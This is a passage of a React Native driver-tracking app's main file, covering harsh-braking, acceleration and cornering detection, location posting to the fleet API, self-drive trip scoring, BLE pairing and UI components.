  } else if (deltaTimeSeconds < HARSH_BRAKE_MIN_TIME_GAP_SECONDS) {
    skipReason = 'delta_time_too_short';
  } else if (deltaTimeSeconds > HARSH_BRAKE_MAX_TIME_GAP_SECONDS) {
    skipReason = 'delta_time_too_long';
  } else if (speedGainKmh < HARSH_ACCELERATION_MIN_SPEED_GAIN_KMH) {
    skipReason = 'speed_gain_not_meaningful';
  } else if (!Number.isFinite(accelerationMs2) || accelerationMs2 <= 0) {
    skipReason = 'acceleration_not_valid';
  } else if (accelerationMs2 < HARSH_ACCELERATION_THRESHOLD_MS2) {
    skipReason = 'below_threshold';
  } else if (cooldownRemainingMs !== null && cooldownRemainingMs > 0) {
    skipReason = 'cooldown_active';
  }

  console.log('[HarshAcceleration] telemetry check', {
    previousSpeedKmh: previousSpeedKmh !== null ? roundToSingleDecimal(previousSpeedKmh) : null,
    currentSpeedKmh: currentSpeedKmh !== null ? roundToSingleDecimal(currentSpeedKmh) : null,
    deltaTimeSeconds: Number.isFinite(deltaTimeSeconds) ? roundToSingleDecimal(deltaTimeSeconds) : null,
    accelerationMs2: Number.isFinite(accelerationMs2) ? roundToSingleDecimal(accelerationMs2) : null,
    result: skipReason ? 'skipped' : 'triggered',
    reason: skipReason || 'threshold_crossed',
  });

  if (skipReason) {
    return { event: null, reason: skipReason };
  }

  return {
    event: buildHarshAccelerationEvent({
      accelerationMs2,
      previousSpeedKmh,
      currentSpeedKmh,
      deltaTimeSeconds,
    }),
    reason: 'triggered',
  };
}

function evaluateSharpCornering(currentSample, telemetryState, motionQuality) {
  const currentSpeedKmh = readNumericValue(currentSample?.speedKmh);
  const currentTimestamp = readNumericValue(currentSample?.timestamp);
  const currentHeading = readNumericValue(currentSample?.heading);

  if (currentSpeedKmh === null || currentTimestamp === null || currentHeading === null) {
    return { event: null, reason: 'invalid_current_sample' };
  }

  const reliableHistory = (telemetryState?.samples || [])
    .filter(isReliableTelemetrySample)
    .sort((left, right) => left.timestamp - right.timestamp);
  const previousSample = [...reliableHistory]
    .reverse()
    .find((sample) => sample.timestamp < currentTimestamp);

  if (!previousSample) {
    return { event: null, reason: 'missing_previous_sample' };
  }

  const previousHeading = readNumericValue(previousSample.heading);
  const deltaTimeSeconds = (currentTimestamp - previousSample.timestamp) / 1000;
  const headingDeltaDegrees = normalizeHeadingDeltaDegrees(currentHeading, previousHeading);
  const gyroMagnitudeRadS = readNumericValue(motionQuality?.gyroMagnitudeRadS) || 0;
  const cooldownRemainingMs =
    telemetryState?.lastSharpCorneringAt && currentTimestamp > telemetryState.lastSharpCorneringAt
      ? SHARP_CORNERING_COOLDOWN_MS - (currentTimestamp - telemetryState.lastSharpCorneringAt)
      : null;

  let skipReason = null;

  if (motionQuality?.shouldRejectDrivingEvent) {
    skipReason = motionQuality.disturbanceReason || 'device_disturbance_detected';
  } else if (currentSpeedKmh < SHARP_CORNERING_MIN_SPEED_KMH) {
    skipReason = 'current_speed_below_minimum';
  } else if (deltaTimeSeconds < 1 || deltaTimeSeconds > 6) {
    skipReason = 'delta_time_out_of_range';
  } else if (headingDeltaDegrees === null || headingDeltaDegrees < SHARP_CORNERING_HEADING_DELTA_DEGREES) {
    skipReason = 'heading_delta_too_low';
  } else if (gyroMagnitudeRadS < SHARP_CORNERING_GYRO_THRESHOLD_RAD_S) {
    skipReason = 'gyro_rotation_too_low';
  } else if (cooldownRemainingMs !== null && cooldownRemainingMs > 0) {
    skipReason = 'cooldown_active';
  }

  console.log('[SharpCornering] telemetry check', {
    currentSpeedKmh: currentSpeedKmh !== null ? roundToSingleDecimal(currentSpeedKmh) : null,
    headingDeltaDegrees: headingDeltaDegrees !== null ? roundToSingleDecimal(headingDeltaDegrees) : null,
    gyroMagnitudeRadS: roundToTwoDecimals(gyroMagnitudeRadS),
    deltaTimeSeconds: Number.isFinite(deltaTimeSeconds) ? roundToSingleDecimal(deltaTimeSeconds) : null,
    result: skipReason ? 'skipped' : 'triggered',
    reason: skipReason || 'threshold_crossed',
  });

  if (skipReason) {
    return { event: null, reason: skipReason };
  }

  return {
    event: buildSharpCorneringEvent({
      currentSpeedKmh,
      headingDeltaDegrees,
      gyroMagnitudeRadS,
      deltaTimeSeconds,
    }),
    reason: 'triggered',
  };
}

async function pushLocationUpdate(location) {
  const [storedMode, storedSession, telemetryState, storedTracking, storedSelfDriveProfile, storedPairedBleDevice] = await Promise.all([
    AsyncStorage.getItem(APP_MODE_KEY),
    AsyncStorage.getItem(DRIVER_SESSION_KEY),
    loadTelemetryState(),
    AsyncStorage.getItem(TRACKING_STATUS_KEY),
    AsyncStorage.getItem(SELF_DRIVE_PROFILE_KEY),
    AsyncStorage.getItem(PAIRED_BLE_DEVICE_KEY),
  ]);
  const appMode = storedMode || (storedSession ? APP_MODE_FLEET : storedSelfDriveProfile ? APP_MODE_SELF : null);
  const selfDriveProfile = storedSelfDriveProfile ? normalizeSelfDriveProfile(JSON.parse(storedSelfDriveProfile)) : null;

  if (!storedSession && appMode !== APP_MODE_SELF) {
    return;
  }

  const session = storedSession ? JSON.parse(storedSession) : null;
  const pairedBleDevice = storedPairedBleDevice ? normalizeBleDevice(JSON.parse(storedPairedBleDevice)) : null;
  const trackingStatus = normalizeTrackingState(storedTracking ? JSON.parse(storedTracking) : null);
  const coords = location?.coords;

  if (!coords) {
    return;
  }

  const speedMps = getValidSpeedMps(coords);
  const speedKmh = speedMps !== null ? roundToSingleDecimal(speedMps * 3.6) : null;
  const currentSample = toSample(location, speedMps, speedKmh);
  const motionQuality = evaluateMotionQuality();
  const effectiveOverspeedThresholdKmh =
    appMode === APP_MODE_SELF ? OVERSPEED_DEFAULT_THRESHOLD_KMH : trackingStatus.overspeedThresholdKmh;
  const overspeedEvent =
    speedKmh !== null && speedKmh >= effectiveOverspeedThresholdKmh
      ? buildOverspeedEvent({
          speedKmh,
          thresholdKmh: effectiveOverspeedThresholdKmh,
        })
      : null;
  const harshBrakingResult =
    speedMps !== null && speedKmh !== null
      ? evaluateHarshBraking(currentSample, telemetryState, motionQuality)
      : { event: null, reason: 'missing_speed' };
  const harshAccelerationResult =
    speedMps !== null && speedKmh !== null
      ? evaluateHarshAcceleration(currentSample, telemetryState, motionQuality)
      : { event: null, reason: 'missing_speed' };
  const sharpCorneringResult =
    speedMps !== null && speedKmh !== null
      ? evaluateSharpCornering(currentSample, telemetryState, motionQuality)
      : { event: null, reason: 'missing_speed' };
  const safetyEvents = [
    overspeedEvent,
    harshBrakingResult.event,
    harshAccelerationResult.event,
    sharpCorneringResult.event,
    motionQuality.shouldRejectDrivingEvent
      ? buildDeviceDisturbanceEvent({
          accelerationDeltaMs2: motionQuality.accelerationDeltaMs2 || 0,
          gyroMagnitudeRadS: motionQuality.gyroMagnitudeRadS || 0,
          reason: motionQuality.disturbanceReason || 'device_disturbance_detected',
        })
      : null,
  ].filter(Boolean);

  if (harshBrakingResult.reason === 'missing_speed') {
    console.log('[HarshBraking] skipped: current speed unavailable', {
      previousSpeedKmh: null,
      currentSpeedKmh: null,
      deltaTimeSeconds: null,
      decelerationMs2: null,
    });
  }

  if (
    speedKmh !== null &&
    (
      (appMode === APP_MODE_SELF && !!selfDriveProfile) ||
      isTrackingCommandEnabled(trackingStatus)
    ) &&
    speedKmh >= effectiveOverspeedThresholdKmh
  ) {
    const now = Date.now();
    const lastOverspeedAlertAt = readNumericValue(trackingStatus.lastOverspeedAlertAt) || 0;

    if (now - lastOverspeedAlertAt >= OVERSPEED_ALERT_COOLDOWN_MS) {
      await playOverspeedAlert(speedKmh, effectiveOverspeedThresholdKmh);
      trackingStatus.lastOverspeedAlertAt = now;
      await AsyncStorage.setItem(
        TRACKING_STATUS_KEY,
        JSON.stringify(normalizeTrackingState(trackingStatus))
      );
    } else {
      console.log('[OverspeedAlert] skipped: cooldown active', {
        speedKmh,
        thresholdKmh: effectiveOverspeedThresholdKmh,
      });
    }
  }

  const nextTelemetryState = {
    samples: [...(telemetryState.samples || []), currentSample]
      .filter(isReliableTelemetrySample)
      .sort((left, right) => left.timestamp - right.timestamp)
      .slice(-MAX_TELEMETRY_SAMPLES),
    lastHarshBrakingAt:
      harshBrakingResult.event !== null ? currentSample.timestamp : telemetryState.lastHarshBrakingAt,
    lastHarshAccelerationAt:
      harshAccelerationResult.event !== null ? currentSample.timestamp : telemetryState.lastHarshAccelerationAt,
    lastSharpCorneringAt:
      sharpCorneringResult.event !== null ? currentSample.timestamp : telemetryState.lastSharpCorneringAt,
  };

  if (appMode === APP_MODE_SELF && selfDriveProfile) {
    const [activeTrip, tripHistory] = await Promise.all([
      loadSelfDriveActiveTrip(),
      loadSelfDriveTripHistory(),
    ]);
    const nowIso = new Date(currentSample.timestamp).toISOString();
    const isMoving = speedKmh !== null && speedKmh >= SELF_DRIVE_TRIP_START_SPEED_KMH;
    let nextActiveTrip = activeTrip;
    let nextTripHistory = normalizeTripHistory(tripHistory);
    let completedTrip = null;

    if (!nextActiveTrip && isMoving) {
      nextActiveTrip = {
        id: `self_trip_${currentSample.timestamp}`,
        label: buildSelfDriveTripLabel(nowIso),
        startedAt: nowIso,
        lastUpdatedAt: nowIso,
        lastMovingAt: nowIso,
        distanceKm: 0,
        topSpeedKmh: speedKmh || 0,
        eventCounts: {
          overspeed: 0,
          harsh_braking: 0,
          harsh_acceleration: 0,
          sharp_cornering: 0,
          device_disturbance: 0,
        },
        events: [],
        lastLocation: {
          lat: currentSample.lat,
          lng: currentSample.lng,
        },
      };
    }

    if (nextActiveTrip) {
      const segmentDistanceKm = calculateDistanceKm(nextActiveTrip.lastLocation, {
        lat: currentSample.lat,
        lng: currentSample.lng,
      });
      nextActiveTrip.distanceKm = roundToSingleDecimal((nextActiveTrip.distanceKm || 0) + segmentDistanceKm);
      nextActiveTrip.topSpeedKmh = Math.max(nextActiveTrip.topSpeedKmh || 0, speedKmh || 0);
      nextActiveTrip.lastUpdatedAt = nowIso;
      nextActiveTrip.lastLocation = {
        lat: currentSample.lat,
        lng: currentSample.lng,
      };

      if (isMoving) {
        nextActiveTrip.lastMovingAt = nowIso;
      }

      for (const event of safetyEvents) {
        nextActiveTrip.events.push({
          id: `${event.type}_${currentSample.timestamp}_${nextActiveTrip.events.length}`,
          type: event.type,
          timestamp: nowIso,
          meta: event.meta || {},
        });
        nextActiveTrip.eventCounts[event.type] = (nextActiveTrip.eventCounts[event.type] || 0) + 1;
      }

      const idleMs = nextActiveTrip.lastMovingAt
        ? (new Date(nowIso).getTime() - new Date(nextActiveTrip.lastMovingAt).getTime())
        : 0;
      const shouldCloseTrip = !isMoving && idleMs >= SELF_DRIVE_TRIP_IDLE_STOP_MS;

        if (shouldCloseTrip) {
          const finishedTrip = {
            ...nextActiveTrip,
            endedAt: nowIso,
            confidence: pairedBleDevice ? 'High' : nextTripHistory.length ? 'Medium' : 'Low',
            vehicleModel: selfDriveProfile.vehicleModel || null,
            vehiclePlate: selfDriveProfile.vehiclePlate || null,
          };
          finishedTrip.score = computeTripScore(finishedTrip.events, finishedTrip.topSpeedKmh);
          nextTripHistory = [finishedTrip, ...nextTripHistory].slice(0, SELF_DRIVE_HISTORY_LIMIT);
          completedTrip = finishedTrip;
          nextActiveTrip = null;
        }
      }

    const nextMetrics = summarizeTripHistory(
      nextTripHistory,
      pairedBleDevice ? pairedBleDevice.name : 'Pair vehicle',
      pairedBleDevice ? 'High' : nextTripHistory.length ? 'Medium' : 'Low'
    );
    nextMetrics.currentSpeedKmh = speedKmh !== null ? roundToSingleDecimal(speedKmh) : 0;
    nextMetrics.vehiclePresenceStatus = getSelfDriveVehiclePresenceStatus({
      speedKmh,
      pairedBleDevice,
      trustedVehicleNearby: false,
    });

      await Promise.all([
        saveSelfDriveActiveTrip(nextActiveTrip),
        saveSelfDriveTripHistory(nextTripHistory),
        AsyncStorage.setItem(SELF_DRIVE_METRICS_KEY, JSON.stringify(nextMetrics)),
        saveTelemetryState(nextTelemetryState),
      ]);

      if (completedTrip && selfDriveProfile.id) {
        try {
          await syncSelfDriveTripToCloud({
            profileId: selfDriveProfile.id,
            trip: completedTrip,
            latestMetrics: nextMetrics,
            pairedBleDevice,
          });
        } catch (error) {
          console.error('Failed to sync self-drive trip to cloud:', error);
        }
      }

      console.log('[SelfDriveTrip] local update', {
        activeTripId: nextActiveTrip?.id || null,
      tripHistoryCount: nextTripHistory.length,
      speedKmh,
      safetyEventTypes: safetyEvents.map((event) => event.type),
    });

    return {
      updatedSelfDrive: true,
      metrics: nextMetrics,
      activeTrip: nextActiveTrip,
      history: nextTripHistory,
    };
  }

  console.log('[DriverLocation] payload', {
    driverId: session.driverId,
    fleetId: session.fleetId,
    lat: coords.latitude,
    lng: coords.longitude,
    heading: typeof coords.heading === 'number' ? coords.heading : null,
    speed: speedMps,
    speedKmh,
    dutyStatus: trackingStatus.dutyStatus,
    trackingExpected: trackingStatus.trackingExpected,
    sessionId: trackingStatus.sessionId,
    deviceTime: new Date(currentSample.timestamp).toISOString(),
    motionQuality,
    safetyEvents,
  });

  await apiRequest('/api/driver-location', {
    method: 'POST',
    body: JSON.stringify({
      driverId: session.driverId,
      fleetId: session.fleetId,
      lat: coords.latitude,
      lng: coords.longitude,
      heading: typeof coords.heading === 'number' ? coords.heading : null,
      speed: speedMps,
      speedKmh,
      dutyStatus: trackingStatus.dutyStatus,
      trackingExpected: trackingStatus.trackingExpected,
      sessionId: trackingStatus.sessionId,
      deviceTime: new Date(currentSample.timestamp).toISOString(),
      safetyEvents,
    }),
  });

  await saveTelemetryState(nextTelemetryState);

  return {
    updatedSelfDrive: false,
  };
}

async function getBestAvailableLocation() {
  try {
    const currentLocation = await Location.getCurrentPositionAsync({
      accuracy: Location.Accuracy.High,
      mayShowUserSettingsDialog: true,
    });

    if (currentLocation?.coords) {
      return currentLocation;
    }
  } catch (error) {
    console.error('Failed to fetch current location:', error);
  }

  try {
    const lastKnownLocation = await Location.getLastKnownPositionAsync();
    return lastKnownLocation?.coords ? lastKnownLocation : null;
  } catch (error) {
    console.error('Failed to fetch last known location:', error);
    return null;
  }
}

async function pushTrackingStatus({
  isTracking,
  dutyStatus,
  trackingExpected,
  reason,
  sessionId,
}) {
  const storedSession = await AsyncStorage.getItem(DRIVER_SESSION_KEY);

  if (!storedSession) {
    return;
  }

  const session = JSON.parse(storedSession);

  await apiRequest('/api/driver-tracking-status', {
    method: 'POST',
    body: JSON.stringify({
      driverId: session.driverId,
      fleetId: session.fleetId,
      isTracking,
      dutyStatus,
      trackingExpected,
      reason: reason || null,
      sessionId: sessionId || null,
      statusSource: 'driver_app',
      changedAt: new Date().toISOString(),
    }),
  });
}

TaskManager.defineTask(LOCATION_TASK_NAME, async ({ data, error }) => {
  if (error) {
    console.error('Background location task error:', error);
    return;
  }

  const locations = data?.locations;

  if (!locations?.length) {
    return;
  }

  try {
    const result = await pushLocationUpdate(locations[locations.length - 1]);
    const storedMode = await AsyncStorage.getItem(APP_MODE_KEY);

    if (storedMode === APP_MODE_SELF || result?.updatedSelfDrive) {
      return;
    }

    const storedTracking = await AsyncStorage.getItem(TRACKING_STATUS_KEY);
    const nextTrackingState = normalizeTrackingState(
      storedTracking ? JSON.parse(storedTracking) : null
    );

    nextTrackingState.isTracking = true;
    nextTrackingState.lastUpdatedAt = new Date().toISOString();
    nextTrackingState.reason = null;

    await AsyncStorage.setItem(TRACKING_STATUS_KEY, JSON.stringify(nextTrackingState));
  } catch (taskError) {
    console.error('Failed to push background location:', taskError);
  }
});

function Card({ children, style }) {
  return <View style={[styles.card, style]}>{children}</View>;
}

function Label({ children }) {
  return <Text style={styles.label}>{children}</Text>;
}

function JoinField({ label, value, onChangeText, placeholder, keyboardType, maxLength, autoCapitalize }) {
  return (
    <View style={styles.fieldBlock}>
      <Label>{label}</Label>
      <TextInput
        value={value}
        onChangeText={onChangeText}
        placeholder={placeholder}
        placeholderTextColor="#94a3b8"
        keyboardType={keyboardType}
        maxLength={maxLength}
        autoCapitalize={autoCapitalize}
        style={styles.input}
      />
    </View>
  );
}

function StatPill({ title, value, accent = false }) {
  return (
    <View style={[styles.statPill, accent && styles.statPillAccent]}>
      <Text style={[styles.statTitle, accent && styles.statTitleAccent]}>{title}</Text>
      <Text style={[styles.statValue, accent && styles.statValueAccent]}>{value}</Text>
    </View>
  );
}

function SectionTitle({ eyebrow, title, description }) {
  return (
    <View>
      <Text style={styles.sectionEyebrow}>{eyebrow}</Text>
      <Text style={styles.sectionCardTitle}>{title}</Text>
      {description ? <Text style={styles.sectionCardDescription}>{description}</Text> : null}
    </View>
  );
}

function MiniBarChart({ values = [], color = '#0f2a5e', suffix = '' }) {
  const max = Math.max(...values, 1);

  return (
    <View style={styles.chartRow}>
      {values.map((value, index) => (
        <View key={`${color}-${index}`} style={styles.chartBarWrap}>
          <View style={[styles.chartBarTrack, { justifyContent: 'flex-end' }]}>
            <View
              style={[
                styles.chartBar,
                {
                  backgroundColor: color,
                  height: `${Math.max(12, (value / max) * 100)}%`,
                },
              ]}
            />
          </View>
          <Text style={styles.chartBarLabel}>{`${value}${suffix}`}</Text>
        </View>
      ))}
    </View>
  );
}

function ModeChoiceCard({ title, description, accent, onPress }) {
  return (
    <Pressable style={[styles.modeCard, accent && styles.modeCardAccent]} onPress={onPress}>
      <Text style={[styles.modeCardTitle, accent && styles.modeCardTitleAccent]}>{title}</Text>
      <Text style={[styles.modeCardText, accent && styles.modeCardTextAccent]}>{description}</Text>
    </Pressable>
  );
}

function formatDutyStatus(value) {
  if (!value) {
    return 'Off duty';
  }

  return value
    .split('_')
    .map((part) => part.charAt(0).toUpperCase() + part.slice(1))
    .join(' ');
}

export default function App() {
  const { width } = useWindowDimensions();
  const isWide = width >= 768;
  const isExtraWide = width >= 1024;
  const isCompact = width < 380;
  const contentStyles = useMemo(
    () => [
      styles.contentWrap,
      isWide && styles.contentWrapWide,
      isExtraWide && styles.contentWrapExtraWide,
    ],
    [isExtraWide, isWide]
  );

  const [booting, setBooting] = useState(true);
  const [joining, setJoining] = useState(false);
  const [requestingLocation, setRequestingLocation] = useState(false);
  const [driverName, setDriverName] = useState('');
  const [driverPhone, setDriverPhone] = useState('');
  const [vehicleModel, setVehicleModel] = useState('');
  const [vehiclePlate, setVehiclePlate] = useState('');
  const [inviteCode, setInviteCode] = useState('');
  const [appMode, setAppMode] = useState(null);
  const [session, setSession] = useState(null);
  const [selfDriveProfile, setSelfDriveProfile] = useState(null);
  const [selfDriveMetrics, setSelfDriveMetrics] = useState(getDefaultSelfDriveMetrics);
  const [selfDriveTripHistory, setSelfDriveTripHistory] = useState(getDefaultTripHistory);
  const [activeSelfDriveTrip, setActiveSelfDriveTrip] = useState(getDefaultActiveTrip);
  const [selectedTripId, setSelectedTripId] = useState(null);
  const [reportRange, setReportRange] = useState('30D');
  const [trackingState, setTrackingState] = useState(getDefaultTrackingState);
  const [locationPermission, setLocationPermission] = useState('unknown');
  const [motionHealth, setMotionHealth] = useState({
    accelerationDeltaMs2: 0,
    gyroMagnitudeRadS: 0,
    disturbance: 'No',
  });
  const [bleState, setBleState] = useState({
    adapterState: 'unknown',
    isScanning: false,
    scanError: null,
    pairedDevice: null,
    detectedDevices: [],
    confidence: 'Low',
    bluetoothStatus: 'Pair vehicle',
  });
  const trackingStateRef = useRef(getDefaultTrackingState());
  const adminSyncInFlightRef = useRef(false);
  const lastRemotePermissionAlertAtRef = useRef(0);
  const lastAutoBleScanAtRef = useRef(0);
  const accelerometerSampleRef = useRef(null);
  const gyroscopeSampleRef = useRef(null);
  const bleManagerRef = useRef(null);
  const bleStateSubscriptionRef = useRef(null);

  useEffect(() => {
    trackingStateRef.current = trackingState;
  }, [trackingState]);

  useEffect(() => {
    setAudioModeAsync({
      playsInSilentMode: true,
      shouldPlayInBackground: false,
      interruptionMode: 'doNotMix',
    }).catch((error) => {
      console.error('Failed to configure audio mode:', error);
    });

    return () => {
      overspeedAlertPlayer.pause();
    };
  }, []);

  const ensureBleManager = useCallback(() => {
    if (bleManagerRef.current) {
      return bleManagerRef.current;
    }

    try {
      const bleManager = new BleManager();
      bleManagerRef.current = bleManager;
      bleStateSubscriptionRef.current = bleManager.onStateChange((state) => {
        setBleState((current) => ({
          ...current,
          adapterState: state || 'unknown',
        }));
      }, true);
      return bleManager;
    } catch (error) {
      console.error('Failed to initialize BLE manager:', error);
      return null;
    }
  }, []);

  useEffect(() => {
    return () => {
      try {
        bleStateSubscriptionRef.current?.remove?.();
      } catch (error) {
        console.error('Failed to remove BLE state subscription:', error);
      }

      try {
        bleManagerRef.current?.stopDeviceScan?.();
      } catch (error) {
        console.error('Failed to stop BLE scan during cleanup:', error);
      }

      try {
        bleManagerRef.current?.destroy?.();
      } catch (error) {
        console.error('Failed to destroy BLE manager during cleanup:', error);
      }

      bleStateSubscriptionRef.current = null;
      bleManagerRef.current = null;
    };
  }, []);

  useEffect(() => {
    Accelerometer.setUpdateInterval(MOTION_SAMPLE_INTERVAL_MS);
    Gyroscope.setUpdateInterval(MOTION_SAMPLE_INTERVAL_MS);

    const accelerometerSubscription = Accelerometer.addListener((sample) => {
      const magnitude = Math.sqrt((sample.x ** 2) + (sample.y ** 2) + (sample.z ** 2));
      const delta = Math.abs(magnitude - 1) * 9.81;

      accelerometerSampleRef.current = {
        timestamp: Date.now(),
        delta,
      };

      const gyroSample = gyroscopeSampleRef.current;
      const gyroMagnitude = gyroSample?.magnitude || 0;
      const isDeviceDisturbance = delta >= DEVICE_DISTURBANCE_ACCEL_DELTA_MS2 && gyroMagnitude >= DEVICE_DISTURBANCE_GYRO_RAD_S;
      const disturbanceReason = isDeviceDisturbance ? 'device_motion_spike' : null;

      updateMotionSnapshot({
        timestamp: Date.now(),
        accelerationDeltaMs2: delta,
        gyroMagnitudeRadS: gyroMagnitude,
        isDeviceDisturbance,
        disturbanceReason,
      });
      setMotionHealth({
        accelerationDeltaMs2: roundToSingleDecimal(delta),
        gyroMagnitudeRadS: roundToTwoDecimals(gyroMagnitude),
        disturbance: isDeviceDisturbance ? 'Yes' : 'No',
      });
    });

    const gyroscopeSubscription = Gyroscope.addListener((sample) => {
      const magnitude = Math.sqrt((sample.x ** 2) + (sample.y ** 2) + (sample.z ** 2));
      gyroscopeSampleRef.current = {
        timestamp: Date.now(),
        magnitude,
      };

      const accelSample = accelerometerSampleRef.current;
      const accelerationDelta = accelSample?.delta || latestMotionSnapshot.accelerationDeltaMs2 || 0;
      const isDeviceDisturbance = accelerationDelta >= DEVICE_DISTURBANCE_ACCEL_DELTA_MS2 && magnitude >= DEVICE_DISTURBANCE_GYRO_RAD_S;
      const disturbanceReason = isDeviceDisturbance ? 'device_rotation_spike' : null;

      updateMotionSnapshot({
        timestamp: Date.now(),
        accelerationDeltaMs2: accelerationDelta,
        gyroMagnitudeRadS: magnitude,
        isDeviceDisturbance,
        disturbanceReason,
      });
      setMotionHealth({
        accelerationDeltaMs2: roundToSingleDecimal(accelerationDelta),
        gyroMagnitudeRadS: roundToTwoDecimals(magnitude),
        disturbance: isDeviceDisturbance ? 'Yes' : 'No',
      });
    });

    return () => {
      accelerometerSubscription.remove();
      gyroscopeSubscription.remove();
    };
  }, []);

  useEffect(() => {
    let mounted = true;

    async function bootstrap() {
      try {
          const [
            storedMode,
            storedSession,
            storedTracking,
            storedSelfDriveProfile,
            storedSelfDriveMetrics,
            storedSelfDriveTripHistory,
            storedActiveSelfDriveTrip,
            fgPermission,
            hasStartedTracking,
          ] = await Promise.all([
            AsyncStorage.getItem(APP_MODE_KEY),
            AsyncStorage.getItem(DRIVER_SESSION_KEY),
            AsyncStorage.getItem(TRACKING_STATUS_KEY),
            AsyncStorage.getItem(SELF_DRIVE_PROFILE_KEY),
            AsyncStorage.getItem(SELF_DRIVE_METRICS_KEY),
            AsyncStorage.getItem(SELF_DRIVE_TRIP_HISTORY_KEY),
            AsyncStorage.getItem(SELF_DRIVE_ACTIVE_TRIP_KEY),
            Location.getForegroundPermissionsAsync(),
            Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME).catch(() => false),
          ]);

        if (!mounted) {
          return;
        }

        const inferredMode = storedMode || (storedSession ? APP_MODE_FLEET : storedSelfDriveProfile ? APP_MODE_SELF : null);
        setAppMode(inferredMode);

        if (storedSession) {
          const restoredSession = JSON.parse(storedSession);
          setSession(restoredSession);
          setDriverName(restoredSession.driverName || '');
          setDriverPhone(restoredSession.phone || '');
          setVehicleModel(restoredSession.vehicleModel || '');
          setVehiclePlate(restoredSession.vehiclePlate || '');
        }

        if (storedSelfDriveProfile) {
          const restoredSelfDriveProfile = normalizeSelfDriveProfile(JSON.parse(storedSelfDriveProfile));
          setSelfDriveProfile(restoredSelfDriveProfile);
        }

          if (storedSelfDriveMetrics) {
            setSelfDriveMetrics(normalizeSelfDriveMetrics(JSON.parse(storedSelfDriveMetrics)));
          }

          if (storedSelfDriveTripHistory) {
            const restoredTripHistory = normalizeTripHistory(JSON.parse(storedSelfDriveTripHistory));
            setSelfDriveTripHistory(restoredTripHistory);
            setSelectedTripId(restoredTripHistory[0]?.id || null);
          }

          if (storedActiveSelfDriveTrip) {
            setActiveSelfDriveTrip(JSON.parse(storedActiveSelfDriveTrip));
          }

        const storedBleDevice = await AsyncStorage.getItem(PAIRED_BLE_DEVICE_KEY);
        if (storedBleDevice) {
          const normalizedPairedDevice = normalizeBleDevice(JSON.parse(storedBleDevice));
          setBleState((current) => ({
            ...current,
            pairedDevice: normalizedPairedDevice,
            bluetoothStatus: normalizedPairedDevice ? normalizedPairedDevice.name : current.bluetoothStatus,
          }));
        }

        if (storedTracking) {
          const restoredTrackingState = JSON.parse(storedTracking);
          setTrackingState(
            normalizeTrackingState({
              ...restoredTrackingState,
              isTracking: hasStartedTracking || restoredTrackingState?.isTracking || false,
            })
          );
        } else if (hasStartedTracking) {
          setTrackingState(normalizeTrackingState({
            isTracking: true,
            lastUpdatedAt: null,
            dutyStatus: DEFAULT_DUTY_STATUS,
            trackingExpected: false,
          }));
        }

        setLocationPermission(fgPermission.status);
      } catch (error) {
        console.error('Failed to restore driver session:', error);
      } finally {
        if (mounted) {
          setBooting(false);
        }
      }
    }

    bootstrap();

    return () => {
      mounted = false;
    };
  }, []);

  useEffect(() => {
    if (!isSelfDriveMode) {
      return;
    }

    setSelfDriveMetrics((current) => {
      const nextMetrics = normalizeSelfDriveMetrics({
        ...current,
        bluetoothStatus: bleState.bluetoothStatus,
        confidence: bleState.confidence,
        vehiclePresenceStatus: getSelfDriveVehiclePresenceStatus({
          speedKmh: current.currentSpeedKmh,
          pairedBleDevice: bleState.pairedDevice,
          trustedVehicleNearby: bleState.bluetoothStatus.toLowerCase().includes('trusted vehicle confirmed'),
        }),
      });
      AsyncStorage.setItem(SELF_DRIVE_METRICS_KEY, JSON.stringify(nextMetrics)).catch(() => {});
      return nextMetrics;
    });
  }, [bleState.bluetoothStatus, bleState.confidence, isSelfDriveMode]);

  useEffect(() => {
    if (!isSelfDriveMode) {
      return undefined;
    }

    let cancelled = false;

    async function refreshSelfDriveData() {
      try {
        const [storedMetrics, storedHistory, storedActiveTrip] = await Promise.all([
          AsyncStorage.getItem(SELF_DRIVE_METRICS_KEY),
          AsyncStorage.getItem(SELF_DRIVE_TRIP_HISTORY_KEY),
          AsyncStorage.getItem(SELF_DRIVE_ACTIVE_TRIP_KEY),
        ]);

        if (cancelled) {
          return;
        }

        if (storedMetrics) {
          setSelfDriveMetrics(normalizeSelfDriveMetrics(JSON.parse(storedMetrics)));
        }

        if (storedHistory) {
          const nextHistory = normalizeTripHistory(JSON.parse(storedHistory));
          setSelfDriveTripHistory(nextHistory);
          setSelectedTripId((current) => current || nextHistory[0]?.id || null);
        } else {
          setSelfDriveTripHistory(getDefaultTripHistory());
        }

        setActiveSelfDriveTrip(storedActiveTrip ? JSON.parse(storedActiveTrip) : getDefaultActiveTrip());

        if (selfDriveProfile?.id) {
          const cloudReport = await fetchSelfDriveCloudReport({
            profileId: selfDriveProfile.id,
            range: reportRange,
          });

          if (cancelled) {
            return;
          }

          const cloudSummary = normalizeSelfDriveMetrics(cloudReport?.summary || {});
          const cloudTrips = normalizeTripHistory(cloudReport?.trips || []);

          setSelfDriveMetrics((current) => normalizeSelfDriveMetrics({
            ...current,
            ...cloudSummary,
            bluetoothStatus: cloudSummary.bluetoothStatus || current.bluetoothStatus,
            confidence: cloudSummary.confidence || current.confidence,
          }));

          if (cloudTrips.length) {
            setSelfDriveTripHistory((current) => {
              if (cloudTrips.length >= current.length) {
                return cloudTrips;
              }
              return current;
            });
            setSelectedTripId((current) => current || cloudTrips[0]?.id || null);
          }
        }
      } catch (error) {
        console.error('Failed to refresh self-drive trip data:', error);
      }
    }

    refreshSelfDriveData();
    const intervalId = setInterval(refreshSelfDriveData, 10000);

    return () => {
      cancelled = true;
      clearInterval(intervalId);
    };
  }, [isSelfDriveMode, reportRange, selfDriveProfile?.id]);

  const locationStatusText = useMemo(() => {
    if (locationPermission === 'granted') {
      return 'Granted';
    }
    if (locationPermission === 'denied') {
      return 'Denied';
    }
    return 'Pending';
  }, [locationPermission]);

  const isFleetMode = appMode === APP_MODE_FLEET;
  const isSelfDriveMode = appMode === APP_MODE_SELF;
  const selfDriveRangeSummary = useMemo(() => {
    const rangeMap = {
      '7D': 'Past 7 days',
      '30D': 'Past 30 days',
      '60D': 'Past 60 days',
      '90D': 'Past 90 days',
    };

    return rangeMap[reportRange] || 'Past 30 days';
  }, [reportRange]);
  const filteredSelfDriveHistory = useMemo(
    () => filterTripHistoryByRange(selfDriveTripHistory, reportRange),
    [reportRange, selfDriveTripHistory]
  );
  const selfDriveReportMetrics = useMemo(
    () => summarizeTripHistory(filteredSelfDriveHistory, bleState.bluetoothStatus, bleState.confidence),
